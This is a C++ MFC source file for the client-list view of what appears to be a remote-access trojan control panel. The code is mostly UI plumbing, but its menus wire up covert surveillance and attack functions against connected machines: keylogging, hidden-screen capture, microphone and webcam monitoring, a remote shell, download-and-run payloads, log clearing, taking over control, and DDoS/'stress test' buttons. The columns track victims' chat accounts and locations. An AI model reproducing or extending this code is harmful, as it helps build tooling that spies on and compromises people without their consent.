// QuickView.cpp : implementation of the CQuickView class
//

#include "stdafx.h"
#include "Quick.h"
#include "MainFrm.h"
#include "QuickDoc.h"
#include "QuickView.h"
#include "LogView.h"
#include "LocalUpload.h"
#include "InputDlg.h"
#include "ChangeGroupDlg.h"
#include "CopyClientDlg.h"

#include "BuildDlg.h"
#include "TabView.h"
#include "PlugView.h"
#include "ScreenMonitorDlg.h"


extern CScreenMonitorDlg* g_pScreenMonitorDlg;
extern CLogView* g_pLogView;
extern CPlugView* g_pCPlugView;
extern ISocketBase* g_pSocketBase;
extern CMainFrame* g_pFrame;
extern CTabView* g_pTabView;
#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CQuickView


IMPLEMENT_SERIAL(CMessageRecordItemCheck, CXTPReportRecordItemText, VERSIONABLE_SCHEMA | _XTP_SCHEMA_CURRENT)
IMPLEMENT_DYNCREATE(CQuickView, CXTPReportView)

BEGIN_MESSAGE_MAP(CQuickView, CXTPReportView)
	ON_WM_CREATE()
	ON_WM_SETFOCUS()
	ON_WM_DESTROY()
	ON_NOTIFY(XTP_NM_REPORT_HEADER_RCLICK, XTP_ID_REPORT_CONTROL, OnShowFilterEditandOnShowFieldChooser)   //报表头右键消息
	ON_NOTIFY(NM_CLICK, XTP_ID_REPORT_CONTROL, OnShowGroup)   //报表头左键消息
	ON_NOTIFY(XTP_NM_REPORT_LBUTTONDOWN, XTP_ID_REPORT_CONTROL, OnReportLButtonDown) //报表左键事件
	ON_NOTIFY(NM_DBLCLK, XTP_ID_REPORT_CONTROL, OnReportDBLCLK) //报表左键双击事件
	ON_NOTIFY(NM_RCLICK, XTP_ID_REPORT_CONTROL, OnReportItemRClick)//鼠标右键单击列表行事件
	ON_NOTIFY(XTP_NM_REPORT_GROUPORDERCHANGED, XTP_ID_REPORT_CONTROL, OnReportGroupOrderChanged)//报表组事件
	ON_MESSAGE(WM_ADDTOMAINLIST, OnAddtomainlist)   //添加上线资料
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)//下线


	// 菜单栏消息


	ON_COMMAND(ID_BUTTON_ADDMONITOR, OnMenuitemADDMONITOR)


	ON_COMMAND(ID_BUTTON_KE, OnMenuitemKE)
	ON_COMMAND(ID_BUTTON_DIAN, OnMenuitemDIAN)
	ON_COMMAND(ID_BUTTON_CHA, OnMenuitemCHA)
	ON_COMMAND(ID_BUTTON_DDOS, OnMenuitemDDOS)

	ON_COMMAND(ID_BUTTON_FENZU, OnMenuitemFENZU)
	ON_COMMAND(ID_BUTTON_BEIZHU, OnMenuitemBEIZHU)

	ON_COMMAND(ID_BUTTON_FILE, OnMenuitemFILE)

	ON_COMMAND(ID_BUTTON_DIFSCREEN, OnMenuitemDIFSCREEN)
	ON_COMMAND(ID_BUTTON_QUICKSCREEN, OnMenuitemQUICKSCREEN)
	ON_COMMAND(ID_BUTTON_PLAY, OnMenuitemPLAY)
	ON_COMMAND(ID_BUTTON_HIDESCREEN, OnMenuitemHIDESCREEN)

	ON_COMMAND(ID_BUTTON_SPEAK, OnMenuitemSPEAK)
	ON_COMMAND(ID_BUTTON_AUDIO, OnMenuitemAUDIO)
	ON_COMMAND(ID_BUTTON_WEBCAM, OnMenuitemWEBCAM)

	ON_COMMAND(ID_BUTTON_XITONG, OnMenuitemXITONG)

	ON_COMMAND(ID_BUTTON_CMD, OnMenuitemCMD)
	ON_COMMAND(ID_BUTTON_KEYBOARD, OnMenuitemKEYBOARD)
	ON_COMMAND(ID_BUTTON_REGEDIT, OnMenuitemREGEDIT)
	ON_COMMAND(ID_BUTTON_PROXY, OnMenuitemPROXY)
	ON_COMMAND(ID_BUTTON_CHAT, OnMenuitemCHAT)





END_MESSAGE_MAP()

// CQuickView construction/destruction

CQuickView::CQuickView()
{
	LoginInfo = new LOGININFO;   //缓存使用
	if (!LoginInfo)
	{
		log_严重("CQuickView  LoginInfo = new LOGININFO;  error ");
		exit(0);
	}
}

CQuickView::~CQuickView()
{
	if (m_wndFilterEditBar)
	{
		m_wndFilterEditBar->DestroyWindow();
	}
	SAFE_DELETE_AR(R_g_Column_Data);
	mListmeau.DestroyMenu();
	SAFE_DELETE(LoginInfo);
}

BOOL CQuickView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	return CXTPReportView::PreCreateWindow(cs);
}

// CQuickView drawing

void CQuickView::OnDraw(CDC* /*pDC*/)
{
	CQuickDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	if (!pDoc)
		return;

	// TODO: add draw code for native data here
}


// CQuickView diagnostics

#ifdef _DEBUG
void CQuickView::AssertValid() const
{
	CXTPReportView::AssertValid();
}

void CQuickView::Dump(CDumpContext& dc) const
{
	CXTPReportView::Dump(dc);
}

CQuickDoc* CQuickView::GetDocument() const // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CQuickDoc)));
	return (CQuickDoc*)m_pDocument;
}
#endif //_DEBUG


// CQuickView message handlers

typedef struct
{
	TCHAR* title;		//标题
	int		nWidth;		//宽度
	BOOL    bIsShow;	//是否显示
	BOOL	boutosize;	//自动调整大小
	int		nMaxWidth;	//最大宽度
}LISTHEAD;


LISTHEAD g_Column_Data[] =
{
    {_T("位置/监控"),             65  ,1,1    ,300,},//1               
    {_T("离开/刷新"),             60  ,1,0    ,70,},//2             
    {_T("窗口/截图"),            80  ,1,1    ,200,},//3        
    {_T("系统/管理"),             130 ,1,0    ,160,},//4      
    {_T("OS"),                100 ,1,0    ,60,},//5  
    {_T("视频/查看"),             60  ,1,0    ,30,},//6 
    {_T("聊天/交谈"),             55  ,1,1    ,200,},//7                
    {_T("备注/修改"),             40  ,1,1    ,100,},//8       
    {_T("社交软件"),              60  ,1,1    ,200,},
    {_T("通信/文件"),            60  ,1,0    ,30,},//9        
    {_T("端口/终端"),             60  ,1,0    ,40,},//10       
    {_T("进程/代理"),             80  ,1,0    ,120,},//11       
    {_T("操作日志"),        80  ,1,1    ,200,},//12    
};

// 结构体的总长度除以一个元素的数据长度得出个数
int	g_Column_Count = (sizeof(g_Column_Data) / sizeof(LISTHEAD));

int CQuickView::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	OUT_PUT_FUNCION_NAME_INFO
		if (CXTPReportView::OnCreate(lpCreateStruct) == -1)
		{
			OUT_PUT_FUNCION_NAME_FATAL
				return -1;
		}

	wndReport = &GetReportCtrl();
	if (wndReport == nullptr)
	{
		OUT_PUT_FUNCION_NAME_FATAL
			return -1;
	}

	R_g_Column_Data = new BYTE[g_Column_Count];

	//设置第一列序号
	CXTPReportColumn* pColumnFixed = wndReport->AddColumn(new CXTPReportColumn(0, _T("ID"), 60));

	pColumnFixed->SetFilterable(FALSE);
	pColumnFixed->SetFixed(TRUE);
	pColumnFixed->SetAutoNumbering(TRUE);
	pColumnFixed->SetMinWidth(60);   //设置最大宽度
	pColumnFixed->SetMaxWidth(70);   //设置最大宽度
	pColumnFixed->SetWidth(20);
	pColumnFixed->SetAutoSize(TRUE);   //自动调整大小
	pColumnFixed->SetHeaderAlignment(DT_CENTER);


	wndReport->FocusSubItems(TRUE);  //点击某项是否与焦点；默认F
	wndReport->ShowRowFocus(FALSE);  //显示焦点行

	//设置页眉/页脚分隔样式
	wndReport->GetPaintManager()->SetHeaderRowsDividerStyle(xtpReportFixedRowsDividerBold);
	//wndReport->GetPaintManager()->m_clrHeaderRowsDivider = RGB(255, 0, 0);  //标题分隔行的颜色
	wndReport->GetPaintManager()->SetColumnStyle(xtpReportColumnResource);
	//m_	wndReport->GetPaintManager()->m_bUseAlternativeBackground = TRUE;  //间隔背景
	wndReport->SetScrollMode(xtpReportOrientationAll, xtpReportScrollModeSmooth);  //设置成滚动是平滑还是一格1格的
	wndReport->EnableDoubleBuffering(TRUE); //双缓冲



	//初始化提示
	GetReportCtrl().GetToolTipContext()->SetStyle(xtpToolTipMarkup);  //设置提示风格
	EnableToolTips(TRUE);  //允许提示

	//网格样式 颜色
	GetReportCtrl().SetGridStyle(FALSE, xtpReportGridSmallDots); //网格样式 横
	GetReportCtrl().SetGridStyle(TRUE, xtpReportGridSmallDots); //网格样式  纵
	//GetReportCtrl().SetGridColor(RGB(255, 0, 0)); //网格颜色
	GetReportCtrl().AllowSort(TRUE);    //允许排列
	GetReportCtrl().SetFastDeselectMode(TRUE);//设置快速取消模式
	GetReportCtrl().GetBehavior()->SetScheme(xtpReportBehaviorCodejock1502);  //行为
	//GetReportCtrl().ShowGroupBy(TRUE);//可选分组是否显示
	GetReportCtrl().SetGroupRowsBold(TRUE);//可选分组粗体


	GetReportCtrl().SetMultipleSelection(TRUE);//多选
	GetReportCtrl().GetReportHeader()->AllowColumnResize(TRUE);//允许列调整大小
	GetReportCtrl().GetReportHeader()->SetAutoColumnSizing(TRUE);// 允许或禁止自动调整列大小
	GetReportCtrl().GetReportHeader()->AllowColumnReorder(TRUE);// 允许或禁止列重新排序


	//水印 背景
	OnReportWatermark();

	//读取列显示配置   如果读取不到就初始化
	HKEY hKEY; BOOL b_RegConfi = FALSE;
	if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_READ, &hKEY))
	{
		b_RegConfi = TRUE;
		DWORD dwSize = g_Column_Count;
		DWORD dwType = REG_BINARY;
		if (::RegQueryValueEx(hKEY, _T("ColumnData"), 0, &dwType, (LPBYTE)R_g_Column_Data, &dwSize) == ERROR_SUCCESS)
		{
			b_RegConfi = TRUE;
		}
		else
		{
			b_RegConfi = FALSE;
			for (int i = 0; i < g_Column_Count; i++)
			{
				BOOL IsVisible = TRUE;
				memcpy(R_g_Column_Data + i, &IsVisible, 1);
			}
			WriterReg();
		}

	}
	else
	{
		b_RegConfi = FALSE;
		for (int i = 0; i < g_Column_Count; i++)
		{
			BOOL IsVisible = TRUE;
			memcpy(R_g_Column_Data + i, &IsVisible, 1);
		}
		WriterReg();
	}
	::RegCloseKey(hKEY);


	//设置列
	for (int i = 0; i < g_Column_Count; i++)
	{
		CXTPReportColumn* Coll = new CXTPReportColumn(wndReport->GetColumns()->GetCount(), g_Column_Data[i].title, g_Column_Data[i].nWidth);
		Coll->SetHeaderAlignment(DT_CENTER);
		Coll->AllowRemove(FALSE);
		Coll->SetAutoSize(g_Column_Data[i].boutosize);   //自动调整大小
		Coll->SetMaxWidth(g_Column_Data[i].nMaxWidth);   //设置最大宽度
		//switch (i)   //显示组ICO
		//{
		//case 0: //国旗
		//	Coll->SetIconID(215);
		//	break;
		//case 4: //计算机名
		//	Coll->SetIconID(216);
		//	break;
		//case 5: //系统
		//	Coll->SetIconID(217);
		//	break;
		//case 11:  //摄像头
		//	Coll->SetIconID(218);
		//	break;
		//case 14:  //qq
		//	Coll->SetIconID(219);
		//	break;
		//case 15:  //杀毒软件
		//	Coll->SetIconID(220);
		//	break;

		//case 19: //客户端程序位数
		//	Coll->SetIconID(214);
		//	break;
		//default:
		//	break;
		//}
		wndReport->AddColumn(Coll);

		if (b_RegConfi)
		{
			BOOL IsVisible = FALSE;
			memcpy(&IsVisible, R_g_Column_Data + i, 1);
			Coll->SetVisible(IsVisible);
		}
		else
		{
			Coll->SetVisible(g_Column_Data[i].bIsShow);
		}



		/*	Coll->SetPlusMinus(TRUE);   //设置隐藏旁边的列 箭头
			Coll->SetExpanded(TRUE);
			Coll->SetNextVisualBlock(1);*/
			//if (i == 0)
			//{
			//	Coll->SetMaxWidth(50);
			//	Coll->SetWidth(50);
			//	Coll->SetAutoSize(FALSE);   //固定列宽度
			//}
	}




	//wndReport->Populate(); //添加数据必须


	//初始化菜单项


	//添加菜单项
	mListmeau.CreatePopupMenu();

	mListmeau_copy.CreatePopupMenu();
	mListmeau.InsertMenu(5, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_copy.m_hMenu, _T("复制数据"));
	mListmeau_copy.AppendMenu(MF_STRING | MF_ENABLED, MENU_复制全部, _T("全部资料"));
	mListmeau_copy.AppendMenu(MF_STRING | MF_ENABLED, MENU_复制IP, _T("定位信息"));
	mListmeau_copy.AppendMenu(MF_STRING | MF_ENABLED, MENU_复制聊天, _T("聊天账号"));
	mListmeau_copy.AppendMenu(MF_STRING | MF_ENABLED, MENU_复制名称, _T("电脑名称"));
	mListmeau_copy.AppendMenu(MF_STRING | MF_ENABLED, MENU_复制显卡, _T("显卡信息"));
	mListmeau_copy.AppendMenu(MF_STRING | MF_ENABLED, MENU_复制编号, _T("客户编号"));


	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_获取状态, _T("状态刷新"));
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_加入监控, _T("加入监控"));
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_退出监控, _T("退出监控"));
	mListmeau.AppendMenu(MF_SEPARATOR, NULL);
	//添加二级菜单



	mListmeau_file.CreatePopupMenu();
	mListmeau.InsertMenu(8, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_file.m_hMenu, _T("资料管理"));
	mListmeau_file.AppendMenu(MF_STRING | MF_ENABLED, MENU_文件管理, _T("文件管理"));


	//添加二级菜单

	mListmeau_screen.CreatePopupMenu();
	mListmeau.InsertMenu(9, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_screen.m_hMenu, _T("远程屏幕"));
	mListmeau_screen.AppendMenu(MF_STRING | MF_ENABLED, MENU_差异屏幕, _T("差异屏幕"));
	mListmeau_screen.AppendMenu(MF_STRING | MF_ENABLED, MENU_高速屏幕, _T("高速屏幕"));
	mListmeau_screen.AppendMenu(MF_STRING | MF_ENABLED, MENU_娱乐屏幕, _T("娱乐屏幕"));
	mListmeau_screen.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau_screen.AppendMenu(MF_STRING | MF_ENABLED, MENU_后台屏幕, _T("后台屏幕"));



	//添加二级菜单

	mListmeau_Peripherals.CreatePopupMenu();
	mListmeau.InsertMenu(11, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_Peripherals.m_hMenu, _T("外设管理"));
	mListmeau_Peripherals.AppendMenu(MF_STRING | MF_ENABLED, MENU_播放监听, _T("播放监听"));
	mListmeau_Peripherals.AppendMenu(MF_STRING | MF_ENABLED, MENU_语音监听, _T("语音监听"));
	mListmeau_Peripherals.AppendMenu(MF_STRING | MF_ENABLED, MENU_视频查看, _T("视频查看"));


	//添加二级菜单

	mListmeau_ZJ.CreatePopupMenu();
	mListmeau.InsertMenu(13, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_ZJ.m_hMenu, _T("主机管理"));
	//mListmeau_ZJ.EnableMenuItem(2, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);  //设置禁用

	mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_系统管理, _T("系统管理"));
	mListmeau_ZJ.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_远程终端, _T("远程终端"));
	mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_键盘记录, _T("键盘记录"));
	mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_查注册表, _T("查注册表"));
	mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_代理映射, _T("代理映射"));
	mListmeau_ZJ.AppendMenu(MF_STRING | MF_ENABLED, MENU_远程交谈, _T("远程交谈"));

	//添加二级菜单

	mListmeau_khd.CreatePopupMenu();
	mListmeau.InsertMenu(20, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_khd.m_hMenu, _T("客户管理"));
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_下载运行, _T("下载运行"));
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_上传运行, _T("上传运行"));
	mListmeau_khd.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_清理日志, _T("清理日志"));
	mListmeau_khd.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_重新运行, _T("重新运行"));
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_断开测试, _T("断开测试"));
	mListmeau_khd.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_卸载, _T("卸载"));
	mListmeau_khd.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_移机, _T("转移客户"));
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_复机, _T("复制客户"));
#ifdef BUILD_OPEN
	mListmeau_khd.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_获取控制权, _T("获取控制权"));
	mListmeau_khd.AppendMenu(MF_STRING | MF_ENABLED, MENU_恢复控制权, _T("恢复控制权"));
#endif


	//添加二级菜单

	mListmeau_hh.CreatePopupMenu();
	mListmeau.InsertMenu(30, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_hh.m_hMenu, _T("电源管理"));
	mListmeau_hh.AppendMenu(MF_STRING | MF_ENABLED, MENU_注销, _T("注销"));
	mListmeau_hh.AppendMenu(MF_STRING | MF_ENABLED, MENU_重启, _T("重启"));
	mListmeau_hh.AppendMenu(MF_STRING | MF_ENABLED, MENU_关机, _T("关机"));
	mListmeau_hh.AppendMenu(MF_SEPARATOR, NULL);


	mListmeau.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_驱动插件, _T("驱动插件"));


	//添加二级菜单

	mListmeau_other.CreatePopupMenu();
	mListmeau.InsertMenu(50, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_other.m_hMenu, _T("扩展插件"));

	mListmeau.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_修改分组, _T("修改分组"));
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_修改备注, _T("修改备注"));
	mListmeau.AppendMenu(MF_SEPARATOR, NULL);
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_压力测试, _T("压力测试"));
	mListmeau.AppendMenu(MF_STRING | MF_ENABLED, MENU_运行方式, _T("切换加载"));
	//添加二级菜单

	mListmeau_filter.CreatePopupMenu();
	mListmeau.InsertMenu(60, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)mListmeau_filter.m_hMenu, _T("客户筛选"));
	mListmeau_filter.AppendMenu(MF_STRING | MF_ENABLED, MENU_取消帅选, _T("取消筛选"));
	mListmeau_filter.AppendMenu(MF_STRING | MF_ENABLED, MENU_帅选进程, _T("筛选进程"));


	m_wndFilterEditBar = g_pFrame->CreatewndFilterEdit();

	if (m_wndFilterEdit.GetSafeHwnd() == NULL)
	{
		m_wndFilterEdit.SubclassDlgItem(IDC_FILTEREDIT, m_wndFilterEditBar);
		wndReport->GetColumns()->GetReportHeader()->SetFilterEditCtrl(&m_wndFilterEdit);
	}

	wndReport->GetPaintManager()->m_bShowLockIcon = TRUE;
	return 0;
}



void CQuickView::OnSetFocus(CWnd* pOldWnd)
{
	OUT_PUT_FUNCION_NAME_INFO
		CView::OnSetFocus(pOldWnd);
	GetReportCtrl().SetFocus();
	g_pFrame->m_wndTip.Hide();

}



// 在自我毁灭之前摧毁所有的子形态 
void CQuickView::OnDestroy()
{
	//WriterReg(); //界面样式

	CView::OnDestroy();
}

//保存列表布局
BOOL CQuickView::WriterReg()
{
	OUT_PUT_FUNCION_NAME_INFO
		HKEY hKey;
	::RegOpenKeyEx(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), 0, KEY_SET_VALUE, &hKey);
	::RegDeleteValue(hKey, _T("ColumnData"));
	::RegCloseKey(hKey);

	if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, ((CQuickApp*)AfxGetApp())->g_Exename.GetBuffer(), &hKey))
	{
		if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("ColumnData"), 0, REG_BINARY, (unsigned char*)R_g_Column_Data, g_Column_Count))
		{
			::RegCloseKey(hKey);
			return TRUE;
		}
	}
	::RegCloseKey(hKey);

	return FALSE;
}

void CQuickView::OnInitialUpdate()     //初始化关联过滤器  列表头选择器
{
	OUT_PUT_FUNCION_NAME_INFO
		CView::OnInitialUpdate();


	//GetReportCtrl().GetPaintManager()->m_bUseShellIcon = TRUE;

}

void CQuickView::OnReportWatermark()
{
    if (NULL == wndReport->GetWatermarkBitmap())
    {
        CBitmap bmpWatermark;
        if (bmpWatermark.LoadBitmap(IDB_BITMA_BK))
        {
            wndReport->SetWatermarkBitmap(bmpWatermark, 250);
            wndReport->SetWatermarkAlignment(xtpReportWatermarkCenter | xtpReportWatermarkVCenter);
            wndReport->GetPaintManager()->m_bPrintWatermark = TRUE;
        }
    }
    wndReport->RedrawControl();
}


//报表头左键事件
void CQuickView::OnShowGroup(NMHDR* pNotifyStruct, LRESULT* result)
{
	OUT_PUT_FUNCION_NAME_INFO
		ASSERT(NULL != pNotifyStruct);
	ASSERT(NULL != result);

	XTP_NM_REPORTRECORDITEM* pItemNotify = reinterpret_cast<XTP_NM_REPORTRECORDITEM*>(pNotifyStruct);

	int nRow = -1, nItem = -1, nColumn = -1;
#ifdef 	_DEBUG
	if (pItemNotify->pRow)
	{
		nRow = pItemNotify->pRow->GetIndex();
		nItem = pItemNotify->pItem->GetIndex();
		nColumn = pItemNotify->pColumn->GetIndex();
		TRACE(_T("nRow=%d---nItem=%d---nColumn=%d\n"), nRow, nItem, nColumn);
	}
#endif // 	_DEBUG

	if (pItemNotify->pColumn && !pItemNotify->pRow)
	{
		//nRow = pItemNotify->pRow->GetIndex();
		//nItem = pItemNotify->pItem->GetIndex();
		nColumn = pItemNotify->pColumn->GetIndex();
		TRACE(_T("nRow=%d---nItem=%d---nColumn=%d\n"), nRow, nItem, nColumn);
	}
	else
	{

		return;
	}
	if (nColumn == 0)
	{
		GetReportCtrl().ShowGroupBy(GetReportCtrl().IsGroupByVisible() ? FALSE : TRUE);//可选分组

	}


}


//报表头右键事件
void CQuickView::OnShowFilterEditandOnShowFieldChooser(NMHDR* pNotifyStruct, LRESULT* result)
{
	OUT_PUT_FUNCION_NAME_INFO
		ASSERT(NULL != pNotifyStruct);
	ASSERT(NULL != result);


	XTP_NM_REPORTRECORDITEM* pItemNotify = reinterpret_cast<XTP_NM_REPORTRECORDITEM*>(pNotifyStruct);

	int nRow = -1, nItem = -1, nColumn = -1;
#ifdef 	_DEBUG
	if (pItemNotify->pRow)
	{
		nRow = pItemNotify->pRow->GetIndex();
		nItem = pItemNotify->pItem->GetIndex();
		nColumn = pItemNotify->pColumn->GetIndex();
		TRACE(_T("nRow=%d---nItem=%d---nColumn=%d\n"), nRow, nItem, nColumn);
	}
#endif // 	_DEBUG

	if (pItemNotify->pColumn && !pItemNotify->pRow)
	{
		//nRow = pItemNotify->pRow->GetIndex();
		//nItem = pItemNotify->pItem->GetIndex();
		nColumn = pItemNotify->pColumn->GetIndex();
		//	TRACE(_T("nRow=%d---nItem=%d---nColumn=%d\n"), nRow, nItem, nColumn);
	}
	else
	{

		return;
	}
	if (nColumn == 0)
	{
		//右键列表头第一项弹出菜单
		CMenu menu;
		VERIFY(menu.CreatePopupMenu());
		menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("关键字过滤器"));
		menu.AppendMenu(MF_SEPARATOR, NULL);
		menu.AppendMenu(MF_STRING | MF_ENABLED, 101, _T("收缩所有类别"));
		menu.AppendMenu(MF_STRING | MF_ENABLED, 102, _T("展开一级缩进"));
		menu.AppendMenu(MF_STRING | MF_ENABLED, 103, _T("展开所有缩进"));
#ifndef _XTP_INCLUDE_COMMANDBARS
		int nMenuResult = menu.TrackPopupMenu(TPM_RETURNCMD | TPM_LEFTALIGN | TPM_RIGHTBUTTON, pItemNotify->pt.x, pItemNotify->pt.y, this, NULL);
#else
		int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, pItemNotify->pt.x, pItemNotify->pt.y, this, NULL);
#endif
		if (!nMenuResult) 	return;

		switch (nMenuResult)
		{
		case 100:   //打开过滤器
		{
			CMainFrame* pMainFrm = (CMainFrame*)AfxGetMainWnd();
			if (pMainFrm)
			{
				BOOL bShow = m_wndFilterEditBar->IsVisible() ? FALSE : TRUE;
				pMainFrm->ShowControlBar(m_wndFilterEditBar, bShow, FALSE);
			}
		}
		break;
		case 101:
		{
			wndReport->CollapseAll();
		}
		break;
		case 102:
		{
			wndReport->ExpandAll(FALSE);
		}
		break;
		case 103:
		{
			wndReport->ExpandAll(TRUE);
			break;
		}

		}

	}

	if (nColumn >= 1)   //打开列表选择器
	{
		//CMainFrame* pMainFrm = (CMainFrame*)AfxGetMainWnd();
		//if (pMainFrm)
		//{
		//	BOOL bShow = !pMainFrm->m_wndFieldChooser.IsVisible();
		//	pMainFrm->ShowControlBar(&pMainFrm->m_wndFieldChooser, bShow, FALSE);
		//}
			// 按项目创建排列
		CXTPReportColumns* pColumns = GetReportCtrl().GetColumns();
		CXTPReportColumn* pColumn = pItemNotify->pColumn;
		int nColumnCount = pColumns->GetCount();
		// 创建列项目
		CMenu menuColumns;
		VERIFY(menuColumns.CreatePopupMenu());
		for (nColumn = 1; nColumn < nColumnCount; nColumn++)
		{
			CXTPReportColumn* pCol = pColumns->GetAt(nColumn);
			CString sCaption = pCol->GetCaption();
			//if (!sCaption.IsEmpty())
			menuColumns.AppendMenu(MF_STRING, 200 + nColumn, sCaption);
			menuColumns.CheckMenuItem(200 + nColumn,
				MF_BYCOMMAND | (pCol->IsVisible() ? MF_CHECKED : MF_UNCHECKED));
		}

#ifndef _XTP_INCLUDE_COMMANDBARS
		int nMenuResult = menu.TrackPopupMenu(TPM_RETURNCMD | TPM_LEFTALIGN | TPM_RIGHTBUTTON, pItemNotify->pt.x, pItemNotify->pt.y, this, NULL);
#else
		int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menuColumns, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, pItemNotify->pt.x, pItemNotify->pt.y, this, NULL);
#endif
		if (!nMenuResult)
		{

			return;
		}

		// 处理列选择项
		if (nMenuResult >= 200)
		{
			CXTPReportColumn* pCol = pColumns->GetAt(nMenuResult - 200);
			if (pCol)
			{
				BOOL IsVisible = TRUE;
				pCol->SetVisible(pCol->IsVisible() ? FALSE : TRUE);
				IsVisible = pCol->IsVisible();
				memcpy(R_g_Column_Data + (nMenuResult - 200 - 1), &IsVisible, 1);
				WriterReg();
			}
		}
	}

}


//报表左键事件
void CQuickView::OnReportLButtonDown(NMHDR* pNMHDR, LRESULT* pResult) {
	XTP_NM_REPORTRECORDITEM* pItemNotify = (XTP_NM_REPORTRECORDITEM*)pNMHDR;

	OUT_PUT_FUNCION_NAME_INFO
		p_ReportSelectedRows = wndReport->GetSelectedRows();
	if (pItemNotify->pRow == nullptr)
	{
		return;
	}
	int rowIndex = pItemNotify->pRow->GetIndex();//行号 
	CXTPReportRow* pRow = wndReport->GetRows()->GetAt(rowIndex);
	if (pRow == nullptr)
	{
		return;
	}
	if (pRow->IsGroupRow())
	{
		return;
	}
	CString colCaption = pItemNotify->pColumn->GetCaption();//列标题 


	if (colCaption.Find(_T("截图")) != -1)
	{
		g_pFrame->m_wndTip.Hide();

		if (pRow == nullptr) return;
		if (pRow->IsGroupRow()) return;
		ClientContext* pContext = (ClientContext*)(((pRow->GetRecord())->GetItem(0))->GetItemData());
		if (pContext)
		{
			g_pFrame->m_wndTip.Show(pContext);
			g_pFrame->m_wndTip.Hide();
			g_pFrame->m_wndTip.Show(pContext);
		}

	}

	//if (colCaption.Find(_T("")) != -1)
	//{
	//	g_pFrame->m_wndTip.Hide();

	//	if (pRow == nullptr) return;
	//	if (pRow->IsGroupRow()) return;
	//	ClientContext* pContext = (ClientContext*)(((pRow->GetRecord())->GetItem(0))->GetItemData());
	//	if (pContext)
	//	{
	//		g_pFrame->m_wndTip.Show(pContext);
	//		g_pFrame->m_wndTip.Hide();
	//		g_pFrame->m_wndTip.Show(pContext);
	//	}

	//}




	//// 按项目创建排列
	//CXTPReportColumns* pColumns = GetReportCtrl().GetColumns();
	//CXTPReportColumn* pCol = pColumns->GetAt(colIndex);
	//CString titel = pCol->GetCaption();
	//if (titel.Compare(_T("窗口 ☝")) == 0)
	//{
	//	if (pRow == nullptr) return;
	//	if (pRow->IsGroupRow()) return;
	//	ClientContext* pContext = (ClientContext*)(((pRow->GetRecord())->GetItem(0))->GetItemData());
	//	if (pContext)
	//	{
	//		g_pFrame->m_wndTip.Show(pContext);
	//		g_pFrame->m_wndTip.Hide();
	//		g_pFrame->m_wndTip.Show(pContext);
	//	}
	//}



	//int colIndex = pItemNotify->pColumn->GetIndex();//列号 
	//int colItemIndex = pItemNotify->pColumn->GetItemIndex();//列号 
	//CString colCaption = pItemNotify->pColumn->GetCaption();//列标题 
	//int itemIndex = pItemNotify->pItem->GetIndex();//列号 
	//CString itemCaption = pItemNotify->pItem->GetCaption(pItemNotify->pColumn);//项内容 
	//CString str = _T("");
	//str.Format(_T("左键单击rowIndex=%d,colIndex=%d,colItemIndex=%d,colCaption=%s,itemIndex=%d,itemCaption = % s"),
